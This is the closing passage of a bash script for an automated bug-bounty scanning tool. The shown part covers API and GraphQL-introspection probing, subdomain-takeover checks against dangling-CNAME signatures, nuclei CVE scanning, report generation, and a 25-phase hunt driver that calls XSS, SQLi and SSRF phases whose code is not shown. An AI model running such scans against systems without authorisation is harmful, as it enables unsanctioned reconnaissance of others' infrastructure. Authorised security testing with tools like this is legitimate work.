      code="$(run_with_timeout 10 curl -o /dev/null -s -w "%{http_code}" -m 8 "$url" 2>/dev/null || echo 0)"

      if [[ "$code" =~ ^2 ]]; then
        log_ok "API endpoint: ${url} (HTTP ${code})"
        echo "$url" >> "${out}/api_endpoints.txt"
        echo "$content" > "${out}/api_$(echo "$url" | md5sum | cut -c1-8).json"

        # Detect Swagger/OpenAPI
        if echo "$content" | grep -qiE '"swagger"|"openapi"'; then
          append_finding "${base}/findings.txt" "INFO" "API_SWAGGER" "Swagger/OpenAPI exposed: $url"
        fi

        # Detect GraphQL
        if echo "$content" | grep -qiE '"data"|"errors"|"__schema"'; then
          append_finding "${base}/findings.txt" "MEDIUM" "API_GRAPHQL" "GraphQL endpoint: $url"
          # Try introspection
          for q in "${GRAPHQL_INTROSPECTION[@]}"; do
            local gql_resp
            gql_resp="$(run_with_timeout 10 curl -fsSL -m 8 -X POST "$url" \
              -H "Content-Type: application/json" \
              -d "$q" 2>/dev/null || true)"
            if echo "$gql_resp" | grep -qi "__schema"; then
              log_ok "GraphQL introspection enabled: $url"
              append_finding "${base}/findings.txt" "HIGH" "GRAPHQL_INTROSPECTION" "Introspection enabled: $url"
              echo "$gql_resp" > "${out}/graphql_schema_$(echo "$url" | md5sum | cut -c1-8).json"
            fi
          done
        fi
      fi
    done
  done < "$live"

  log_ok "Phase 22 complete — API discovery done. Results: ${out}/"
}

_phase_subdomain_takeover() {
  local target="$1" base="$2"
  local out="${base}/23_subdomain_takeover"
  mkdir -p "$out"
  log_phase 23 25 "SUBDOMAIN TAKEOVER"

  local subs="${base}/all_subdomains_resolved.txt"
  [[ ! -s "$subs" ]] && subs="${base}/all_subdomains_raw.txt"
  [[ ! -s "$subs" ]] && { log_warn "No subdomains for takeover check."; return; }

  local pids=()

  # subzy
  if ensure_tool subzy 2>/dev/null; then
    log_info "subzy — subdomain takeover check…"
    {
      run_with_timeout 600 subzy run \
        --targets "$subs" \
        --hide-fails \
        --output "${out}/subzy_results.json" 2>/dev/null || true
      grep -i "vulnerable" "${out}/subzy_results.json" 2>/dev/null | \
        while IFS= read -r line; do
          append_finding "${base}/findings.txt" "HIGH" "SUBDOMAIN_TAKEOVER" "subzy: ${line:0:200}"
        done || true
    } &
    pids+=($!)
  fi

  # subjack
  if ensure_tool subjack 2>/dev/null; then
    log_info "subjack — subdomain takeover check…"
    {
      local fingerprints="${HOME}/go/src/github.com/haccer/subjack/fingerprints.json"
      [[ ! -f "$fingerprints" ]] && fingerprints="/opt/subjack/fingerprints.json"
      local fp_arg=""
      [[ -f "$fingerprints" ]] && fp_arg="-c $fingerprints"
      run_with_timeout 600 subjack \
        -w "$subs" \
        -t 100 \
        -o "${out}/subjack_results.txt" \
        -ssl \
        $fp_arg 2>/dev/null || true
      grep -v "^$\|Not" "${out}/subjack_results.txt" 2>/dev/null | \
        while IFS= read -r line; do
          append_finding "${base}/findings.txt" "HIGH" "SUBDOMAIN_TAKEOVER" "subjack: ${line:0:200}"
        done || true
    } &
    pids+=($!)
  fi

  # Manual CNAME check for common dangling services
  log_info "Manual CNAME dangling service check…"
  {
    local -a DANGLING_SIGNATURES=(
      "NoSuchBucket\|no such bucket"
      "There is no app here\|Heroku"
      "No such app\|fastly error"
      "doesn't exist\|GitHub.*404"
      "This domain isn't connected\|Shopify"
      "The specified bucket does not exist\|S3"
      "Project not found\|GitLab"
      "This page is parked\|Azurewebsites"
      "404 Not Found.*pantheon"
    )
    while IFS= read -r sub; do
      [[ -z "$sub" ]] && continue
      local cname
      cname="$(dig +short CNAME "$sub" 2>/dev/null | head -1 || true)"
      [[ -z "$cname" ]] && continue
      local body
      body="$(run_with_timeout 10 curl -fsSL -m 8 "http://${sub}" 2>/dev/null | head -c 2000 || true)"
      for sig in "${DANGLING_SIGNATURES[@]}"; do
        if echo "$body" | grep -qiE "$sig"; then
          log_ok "Subdomain takeover candidate: $sub (CNAME: $cname)"
          append_finding "${base}/findings.txt" "HIGH" "SUBDOMAIN_TAKEOVER" "Dangling CNAME: $sub → $cname"
          echo "TAKEOVER: $sub → $cname" >> "${out}/takeover_candidates.txt"
          break
        fi
      done
    done < "$subs"
  } &
  pids+=($!)

  wait "${pids[@]}" 2>/dev/null || true

  log_ok "Phase 23 complete — Subdomain takeover done. Results: ${out}/"
}

_phase_cve_scan() {
  local target="$1" base="$2"
  local out="${base}/24_cve"
  mkdir -p "$out"
  log_phase 24 25 "CVE SCAN"

  ensure_tool nuclei 2>/dev/null || { log_warn "nuclei not found. Skipping CVE scan."; return; }

  local input="${base}/live_hosts.txt"
  [[ ! -s "$input" ]] && { log_warn "No live hosts for CVE scan."; return; }

  log_info "Nuclei CVE-specific scan…"
  run_with_timeout 1800 nuclei \
    -l "$input" \
    -tags cve \
    -severity critical,high,medium \
    -o "${out}/nuclei_cves.txt" \
    -stats \
    -bulk-size 20 \
    -concurrency 10 \
    -rate-limit 80 \
    -silent 2>/dev/null || true

  local cve_count
  cve_count="$(count_lines "${out}/nuclei_cves.txt")"

  grep -E "\[critical\]|\[high\]" "${out}/nuclei_cves.txt" 2>/dev/null | \
    while IFS= read -r line; do
      local sev="HIGH"
      echo "$line" | grep -qi "critical" && sev="CRITICAL"
      append_finding "${base}/findings.txt" "$sev" "CVE" "${line:0:300}"
    done || true

  log_ok "Phase 24 complete — ${cve_count} CVE findings. Results: ${out}/"
}

_phase_report_generation() {
  local target="$1" base="$2"
  local out="${base}/25_final_report"
  mkdir -p "$out"
  log_phase 25 25 "REPORT GENERATION"

  local findings="${base}/findings.txt"
  local report="${out}/FINAL_REPORT_$(date +%Y%m%d_%H%M%S).md"

  {
    printf "# 🔥 ROXX'S SLAVE v%s — ABYSS OMEGA\n\n" "$DEVIL_VERSION"
    printf "## Target: %s\n\n" "$target"
    printf "**Scan Completed:** %s\n\n" "$(ts)"
    printf "---\n\n"

    # Executive Summary
    printf "## Executive Summary\n\n"
    printf "| Severity | Count |\n|----------|-------|\n"
    for sev in CRITICAL HIGH MEDIUM LOW INFO; do
      local c
      c="$(grep -c "\[$sev\]" "$findings" 2>/dev/null || echo 0)"
      printf "| **%s** | %s |\n" "$sev" "$c"
    done
    printf "\n"

    # Stats
    printf "## Scan Statistics\n\n"
    printf "| Metric | Value |\n|--------|-------|\n"
    printf "| Subdomains Discovered | %s |\n" "$(count_lines "${base}/all_subdomains_raw.txt")"
    printf "| DNS Resolved | %s |\n" "$(count_lines "${base}/all_subdomains_resolved.txt")"
    printf "| Live HTTP Hosts | %s |\n" "$(count_lines "${base}/live_hosts.txt")"
    printf "| Total URLs | %s |\n" "$(count_lines "${base}/all_urls.txt")"
    printf "| Total Findings | %s |\n" "$(count_lines "$findings")"
    printf "\n"

    # Findings by type
    printf "## Findings\n\n"
    for sev in CRITICAL HIGH MEDIUM LOW INFO; do
      local lines
      lines="$(grep "\[$sev\]" "$findings" 2>/dev/null || true)"
      [[ -z "$lines" ]] && continue
      printf "### %s\n\n" "$sev"
      printf '```\n'
      echo "$lines"
      printf '```\n\n'
    done

    # Include chain analysis if exists
    local chain="${base}/18_chains/chain_analysis.md"
    if [[ -f "$chain" ]]; then
      printf "\n---\n\n"
      cat "$chain"
    fi

    printf "\n---\n\n"
    printf "*Report generated by ROXX'S SLAVE v%s — ABYSS OMEGA*\n" "$DEVIL_VERSION"
  } > "$report"

  # Also save a raw JSON summary
  {
    printf '{"target":"%s","timestamp":"%s","version":"%s","findings":[' \
      "$target" "$(ts)" "$DEVIL_VERSION"
    local first=1
    while IFS= read -r line; do
      [[ $first -eq 0 ]] && printf ','
      local ts_val sev type detail
      ts_val="$(echo "$line" | grep -oP '^\[\K[^\]]+')"
      sev="$(echo "$line" | grep -oP '^\[[^\]]+\] \[\K[^\]]+')"
      type="$(echo "$line" | grep -oP '^\[[^\]]+\] \[[^\]]+\] \[\K[^\]]+')"
      detail="$(echo "$line" | sed 's/^\[[^]]*\] \[[^]]*\] \[[^]]*\] //' | \
        sed 's/"/\\"/g' | tr -d '\n')"
      printf '{"ts":"%s","severity":"%s","type":"%s","detail":"%s"}' \
        "$ts_val" "$sev" "$type" "${detail:0:500}"
      first=0
    done < "$findings"
    printf ']}\n'
  } > "${out}/findings_$(date +%Y%m%d_%H%M%S).json"

  log_ok "Phase 25 complete — Report: ${report}"
  printf "\n${BGREEN}╔══════════════════════════════════════════════════════════╗${RESET}\n"
  printf "${BGREEN}║         ✓ HUNT COMPLETE — %s%-30s${BGREEN}║${RESET}\n" "$target" ""
  printf "${BGREEN}║  Report: %-48s${BGREEN}║${RESET}\n" "$(basename "$report")"
  printf "${BGREEN}╚══════════════════════════════════════════════════════════╝${RESET}\n\n"
}

# ══════════════════════════════════════════════════════════════
#  MAIN HUNT ENGINE — 25-PHASE AUTONOMOUS HUNT
# ══════════════════════════════════════════════════════════════

cmd_hunt() {
  local target="${1:-}"
  [[ -z "$target" ]] && {
    log_err "Usage: devil <target>"
    log_info "Example: devil example.com"
    exit 1
  }

  # Sanitise target
  target="${target#http://}"
  target="${target#https://}"
  target="${target%%/*}"

  local base="${FINDINGS_BASE}/${target}"
  mkdir -p "$base"

  local start_ts
  start_ts="$(date +%s)"

  printf "\n${BBLUE}[*] TARGET:${RESET} %s\n" "$target"
  printf "${BBLUE}[*] OUTPUT:${RESET} %s\n" "$base"
  printf "${BBLUE}[*] STARTED:${RESET} %s\n\n" "$(ts)"

  # Initialize findings file
  printf "# ROXX'S SLAVE v%s — ABYSS OMEGA — Hunt: %s — %s\n" \
    "$DEVIL_VERSION" "$target" "$(ts)" > "${base}/findings.txt"

  _phase_passive_recon     "$target" "$base"
  _phase_dns_resolution    "$target" "$base"
  _phase_http_probe        "$target" "$base"
  _phase_port_scan         "$target" "$base"
  _phase_waf_detection     "$target" "$base"
  _phase_screenshot        "$target" "$base"
  _phase_wayback_mining    "$target" "$base"
  _phase_js_analysis       "$target" "$base"
  _phase_param_discovery   "$target" "$base"
  _phase_nuclei_scan       "$target" "$base"
  _phase_xss_hunting       "$target" "$base"
  _phase_sqli_hunting      "$target" "$base"
  _phase_ssrf_hunting      "$target" "$base"
  _phase_open_redirect     "$target" "$base"
  _phase_idor_hunting      "$target" "$base"
  _phase_auth_bypass       "$target" "$base"
  _phase_secret_scanning   "$target" "$base"
  _phase_vuln_chain_analysis "$target" "$base"
  _phase_rate_limit        "$target" "$base"
  _phase_business_logic    "$target" "$base"
  _phase_cloud_checks      "$target" "$base"
  _phase_api_discovery     "$target" "$base"
  _phase_subdomain_takeover "$target" "$base"
  _phase_cve_scan          "$target" "$base"
  _phase_report_generation "$target" "$base"

  local end_ts elapsed
  end_ts="$(date +%s)"
  elapsed=$(( end_ts - start_ts ))
  printf "\n${DIM}Total hunt time: %02dh %02dm %02ds${RESET}\n\n" \
    $(( elapsed/3600 )) $(( (elapsed%3600)/60 )) $(( elapsed%60 ))
}

# ══════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════

main() {
  # Show banner only in interactive or when no args given
  if [[ -t 1 || "${#@}" -eq 0 ]]; then
    show_banner
  fi

  init_dirs

  local cmd="${1:-help}"
  shift 2>/dev/null || true

  case "$cmd" in
    update)   cmd_update ;;
    heal)     cmd_heal ;;
    status)   cmd_status ;;
    dashboard) cmd_dashboard ;;
    targets)  cmd_targets "$@" ;;
    report)   cmd_report "$@" ;;
    chain)    cmd_chain "$@" ;;
    recon)    cmd_recon "$@" ;;
    fuzz)     cmd_fuzz "$@" ;;
    nuclei)   cmd_nuclei_scan "$@" ;;
    scope)    cmd_scope "$@" ;;
    help|--help|-h)
      printf "${WHITE}ROXX'S SLAVE v%s — ABYSS OMEGA${RESET}\n\n" "$DEVIL_VERSION"
      printf "${BCYAN}Usage:${RESET}\n"
      printf "  devil <target>              25-phase autonomous hunt\n"
      printf "  devil update                Force self-update\n"
      printf "  devil heal                  Repair/install missing tools\n"
      printf "  devil status                Show tool status/versions\n"
      printf "  devil dashboard             Start web dashboard on :%s\n" "$DASHBOARD_PORT"
      printf "  devil targets [list|add|remove|clear]\n"
      printf "  devil report <file>         Generate H1/Bugcrowd report\n"
      printf "  devil chain <v1> <v2>       Suggest exploit chains\n"
      printf "  devil recon <target>        Standalone recon\n"
      printf "  devil fuzz <url>            Standalone fuzzing\n"
      printf "  devil nuclei <target>       Full nuclei scan\n"
      printf "  devil scope <program>       Fetch H1/Bugcrowd scope\n"
      printf "\n${DIM}From the depths, we harvest.${RESET}\n\n"
      ;;
    *)
      # Treat unknown arg as target for hunt
      cmd_hunt "$cmd" "$@"
      ;;
  esac
}

main "$@"
